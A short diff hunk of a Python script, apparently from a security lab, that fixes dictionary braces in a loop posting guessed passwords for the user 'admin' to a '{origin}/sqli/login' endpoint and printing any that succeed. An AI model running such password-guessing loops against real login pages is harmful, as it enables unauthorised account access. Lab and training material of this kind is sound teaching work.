@@ -25,7 +25,7 @@
     for char in chars:
         password = "password" + char
         response = requests.post('{origin}/sqli/login', 
-            data={{'username': 'admin', 'password': password}}
+            data={'username': 'admin', 'password': password}
         )
         if 'success' in response.text:
             print(f"Found password: {password}")
